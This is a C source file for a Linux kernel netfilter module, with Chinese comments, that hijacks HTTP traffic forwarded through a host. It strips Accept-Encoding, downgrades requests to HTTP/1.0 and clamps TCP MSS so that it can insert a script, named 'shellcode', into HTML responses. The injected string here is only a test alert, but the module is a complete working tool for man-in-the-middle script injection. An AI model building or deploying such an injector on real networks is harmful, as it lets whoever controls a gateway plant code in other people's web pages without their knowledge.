/* netfilter修改HTTP数据包（插入、修改、删除） */

// 测试内核：3.13.0-32-generic
// sudo apt-get install linux-headers-3.13.0-32 linux-headers-3.13.0-32-generic linux-image-3.13.0-32-generic linux-image-extra-3.13.0-32-generic

// 修改数据包长度后3.13内核可自动修改seq和ack
// 2.68以下内核只是在ct->status中高几位做了标记（IPS_SEQ_ADJUST_BIT），还需要后续手动hook修改

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_packet.h>
#include <linux/skbuff.h>

#include <net/ip.h>
#include <net/tcp.h>

#include <net/netfilter/nf_conntrack_helper.h>
#include <net/netfilter/nf_conntrack_seqadj.h>
#include <net/netfilter/nf_nat_helper.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("songboyu");
MODULE_DESCRIPTION("modify http payload, base on netfilter");
MODULE_VERSION("1.0");

// 待插入字符串
char shellcode[] = "<script>alert('----------------hijacking test--------------')</script>";

// 发出请求时删除请求头中Accept-Encoding字段，防止收到gzip压缩包
int delete_accept_encoding(char *pkg)
{
	char *pK = NULL;
	char *pV = NULL;
	int len = 0;

	// 只修改通过网页发出的html请求
	pK = strstr(pkg,"Accept: text/html");
	if(pK == NULL)	return 0;

	pK = strstr(pkg,"Accept-Encoding:");
	if(pK == NULL)	return 0;

	pV = strstr(pK,"\r\n");
	if(pV == NULL)	return 0;

	len = (long long)pV - (long long)pK;
	
	// 用空格覆盖Accept-Encoding:xxx内存
	memset(pK,' ',len + 2);
	printk(KERN_ALERT "hook_ipv4: ---Delete Accept-Encoding---\n");
	
	return 1;
}

/*
	当握手时修改本次TCP连接MSS值，使插入数据后长度仍小于MTU 
*/
static inline u32 set_tcp_mss(struct sk_buff *pskb, struct tcphdr  *tcph, u16 mtu)  
{  
    u32 optlen, i;  
    u8  *op;  
    u16 newmss, oldmss;  
    u8  *mss;  
  
    if ( !tcph->syn )  
        return 0;  
  
    // 判断是否为合法tcp选项  
    if (tcph->doff*4 < sizeof(struct tcphdr))  
        return 0;  
  
    optlen = tcph->doff*4 - sizeof(struct tcphdr);  
    if (!optlen)  
        return 0;  
  
    // 扫描是否有MSS选项  
    op = ((u8*)tcph + sizeof(struct tcphdr));  
    for (i = 0; i < optlen; ) {  
        if (op[i] == TCPOPT_MSS  && (optlen - i) >= TCPOLEN_MSS  && op[i+1] == TCPOLEN_MSS) {  
            u16 mssval;  
            //newmss = htons( 1356 );  
            oldmss = (op[i+3] << 8) | op[i+2];  
            mssval = (op[i+2] << 8) | op[i+3];  
              
            // 是否小于MTU-( iphdr + tcphdr )  
            if ( mssval > mtu - 40 ) {  
                newmss = htons( mtu - 40 );   
            }  
            else {  
                break;  
            }  
        //   
        mss = &newmss;  
        op[i+2] = newmss & 0xFF;  
        op[i+3] = (newmss & 0xFF00) >> 8;  
        // 计算checksum  
        inet_proto_csum_replace2( &tcph->check, pskb,  
            oldmss, newmss, 0);  
          
        mssval = (op[i+2] << 8) | op[i+3];  
        printk(KERN_ALERT "hook_ipv4: Change TCP MSS %d to %d\n", ntohs( oldmss ), ntohs( newmss ) );  
        break;  
              
        }  
        if (op[i] < 2)  
            i++;  
        else  
            i += op[i+1] ? : 1;  
    }  
    return 0;  
}  

// 钩子函数，发送时修改请求头，接收时修改pkg
unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	struct iphdr *iph = ip_hdr(skb);

	if (iph->protocol == IPPROTO_TCP)
	{	
		// IP frag合并
		/* skb_linearize - convert paged skb to linear one
		* If there is no free memory -ENOMEM is returned, otherwise zero
		* is returned and the old skb data released.
		* 这一步很关键，否则后面根据 包头偏移计算出来 payload 得到东西不是正确的包结构
		* 2.6 以上内核需要这么做。 因为新的系统可能为了提高性能，一个网络包的内容是分成几个 fragments 来保存的
		* 这时 单单根据 skb->data 得到的只是包的第一个 fragments 的东西。我见到我系统上的就是 tcp 头部和 tcp 的 payload
		* 是分开保存在不同的地方的。可能 ip,tcp 头部等是后面系统层才加上的，和应用程序的 payload 来源不一样，使用不同的 fragments就
		* 可以避免复制数据到新缓冲区的操作提高性能。skb_shinfo(skb)->nr_frags 属性指明了这个 skb 网络包里面包含了多少块 fragment了。
		* 具体可以看 《Linux Device Drivers, 3rd Editio》一书的 17.5.3. Scatter/Gather I/O 小节
		* 《Understanding_Linux_Network_Internals》 一书 Chapter 21. Internet Protocol Version 4 (IPv4): Transmission 一章有非常详细的介绍
		* 下面使用的 skb_linearize 函数则可以简单的把 多个的 frag 合并到一起了，我为了简单就用了它。
		*/

		if (0 != skb_linearize(skb)) {
			return NF_ACCEPT;
		}
		struct tcphdr *tcph = tcp_hdr(skb);

		unsigned int saddr = (unsigned int)iph->saddr;
		unsigned int daddr = (unsigned int)iph->daddr;

		unsigned int sport = (unsigned int)ntohs(tcph->source);
		unsigned int dport = (unsigned int)ntohs(tcph->dest);

		char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));

		unsigned int tcplen = skb->len - (iph->ihl*4) - (tcph->doff*4);

		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &saddr, sport, &daddr, dport);

		// 接收到的数据包
		if (sport == 80)
		{	
			// 只处理HTTP请求且请求返回200
			if (memcmp(pkg,"HTTP/1.0 200", 12) != 0 && memcmp(pkg,"HTTP/1.1 200", 12) != 0)
			{
				return NF_ACCEPT;
			}
			// 找到页面源码中插入位置（示例中为<html>后面）
			char *phead = strstr(pkg,">");
			if(phead == NULL) return NF_ACCEPT;

			char* pK = strstr(pkg,"Content-Type: text/html");
			if(pK == NULL)	return NF_ACCEPT;

			pK = strstr(pkg,"<html");
			if(pK == NULL)	return NF_ACCEPT;

			// 尝试不使用nf_nat_mangle_tcp_packet，手动扩容
			// -------------------------------------------------
			// skb扩容，在尾部增加strlen(shellcode)长度
			// 参考：http://book.51cto.com/art/201206/345049.htm
			// pskb_expand_head(skb, 0, strlen(shellcode), GFP_ATOMIC);

			// tail指针向后移动，增加data长度 
			// 参考：http://bbs.chinaunix.net/thread-1941060-1-1.html
			// char *tail = skb_put(skb, strlen(shellcode));

			// 原数据整体向后移动
			// while(tail > phead)
			// {
			// 	tail--;
			// 	*(tail + strlen(shellcode)) = *tail;
			// }
			// 在首部增加shellcode
			// memcpy(phead, shellcode, strlen(shellcode));

			// fix IP hdr checksum information
 			// iph->tot_len = htons(skb->len);
			// ip_send_check(iph);
			// 使用这种方式还需要重新计算校验和（在下面代码中）
			// -------------------------------------------------

			enum ip_conntrack_info ctinfo;
			struct nf_conn *ct = nf_ct_get(skb, &ctinfo);

			// 3.1内核，手动引入nfct_seqadj，使能够自动修改seq以及ack
			nfct_seqadj_ext_add(ct);
			// 若nf_nat_mangle_tcp_packet未找到符号要先执行sudo iptables -t nat --list
			// 接口：
			// static inline int nf_nat_mangle_tcp_packet(struct sk_buff *skb,
			// 		   struct nf_conn *ct,
			// 		   enum ip_conntrack_info ctinfo,
			// 		   unsigned int protoff,
			// 		   unsigned int match_offset,
			// 		   unsigned int match_len,
			// 		   const char *rep_buffer,
			// 		   unsigned int rep_len)
			if (ct && __nf_nat_mangle_tcp_packet(skb, 
						ct, 
						ctinfo,
						iph->ihl * 4, 
						(int)(phead - pkg) + 1, 
						0,
						shellcode, 
						strlen(shellcode), true)) 
			{
				printk(KERN_ALERT "hook_ipv4: ---pkg modify success--- tcplen: %d %d\n", tcplen, (skb->len > ip_skb_dst_mtu(skb) && !skb_is_gso(skb)));
				// ip_finish_output(skb);
		  	}
		}
		// 发出的数据包
		else if (dport == 80)
		{
			set_tcp_mss(skb, tcph, 1500 - strlen(shellcode));
			// 请求头HTTP 1.1 --> HTTP 1.0
			// 防止收到chunked数据包（Transfer-Encoding： chunked是HTTP 1.1中特有的）
			char *pK = strstr(pkg,"HTTP/1.1");
			if(pK == NULL) return NF_ACCEPT;
			memcpy(pK, "HTTP/1.0", 8);

			// 只处理GET请求
			if (memcmp(pkg,"GET",strlen("GET")) != 0)
			{
				return NF_ACCEPT;
			}

			// 发出请求时删除请求头中Accept-Encoding字段，防止收到gzip压缩包
			delete_accept_encoding(pkg);

			// 重新计算校验和
			//-------------------------------------
			int datalen = skb->len - iph->ihl*4;
			skb->ip_summed = CHECKSUM_PARTIAL;
			skb->csum_start = skb_headroom(skb) + skb_network_offset(skb) + iph->ihl * 4;
			skb->csum_offset = offsetof(struct tcphdr, check);
			// ip
			iph->check = 0;
			iph->check = ip_fast_csum(iph, iph->ihl);
			// tcp
			tcph->check = 0;
			tcph->check = ~csum_tcpudp_magic(iph->saddr, iph->daddr,
							datalen, iph->protocol, 0);
			//-------------------------------------
		}
	}
	return NF_ACCEPT;
}

// ==========================================================================
// 2.68以下内核中，以下三个函数由于内核没有导出符号，需要手动把实现粘贴过来的
// ------------------------------------------------------------------
// 1---
/* Adjust one found SACK option including checksum correction */
// static void
// sack_adjust(struct sk_buff *skb,
// 		struct tcphdr *tcph,
// 		unsigned int sackoff,
// 		unsigned int sackend,
// 		struct nf_nat_seq *natseq);
// 2---
/* TCP SACK sequence number adjustment */
// static inline unsigned int
// nf_nat_sack_adjust(struct sk_buff *skb,
// 		   struct tcphdr *tcph,
// 		   struct nf_conn *ct,
// 		   enum ip_conntrack_info ctinfo);
// 3---
/* TCP sequence number adjustment.  Returns 1 on success, 0 on failure */
// int
// nf_nat_seq_adjust(struct sk_buff *skb,
// 		  struct nf_conn *ct,
// 		  enum ip_conntrack_info ctinfo);
// ------------------------------------------------------------------

// 修改seq以及ack的hook函数
// unsigned int fix_seq(unsigned int hooknum, struct sk_buff *skb,
//	   const struct net_device *in, const struct net_device *out, int(*okfn)(
//			   struct sk_buff *))
// {
//   enum ip_conntrack_info ctinfo;
//   struct nf_conn *ct = nf_ct_get(skb, &ctinfo);

//   if (ct && test_bit(IPS_SEQ_ADJUST_BIT, &ct->status) 
//   		&& (ctinfo != IP_CT_RELATED + IP_CT_IS_REPLY)  ) {
//   		nf_nat_seq_adjust(skb, ct, ctinfo);
//   }
//   return NF_ACCEPT;
// }
// ==========================================================================

// 钩子函数注册
static struct nf_hook_ops http_hooks[] = {
	{ 
		.hook 			= hook_func,
		.pf 			= NFPROTO_IPV4,
		.hooknum 		= NF_INET_FORWARD, 
		.priority 		= NF_IP_PRI_MANGLE,
		.owner			= THIS_MODULE
	},
	// 3.2以及2.68以下内核适用
	// {
	// 	.hook		   	= fix_seq,
	// 	.pf			 	= PF_INET,
	// 	.hooknum		= NF_INET_PRE_ROUTING,
	// 	.priority	   	= NF_IP_PRI_CONNTRACK_CONFIRM,
	// 	.owner			= THIS_MODULE
	// },
	// {
	// 	.hook		   	= fix_seq,
	// 	.pf			 	= PF_INET,
	// 	.hooknum		= NF_INET_POST_ROUTING,
	// 	.priority	  	= NF_IP_PRI_CONNTRACK_CONFIRM,
	// 	.owner			= THIS_MODULE
	// },
};

// 模块加载
static int init_hook_module(void)
{
	nf_register_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: insmod\n");

	return 0;
}

// 模块卸载
static void cleanup_hook_module(void)
{
	nf_unregister_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: rmmod\n");
}

module_init(init_hook_module);
module_exit(cleanup_hook_module);
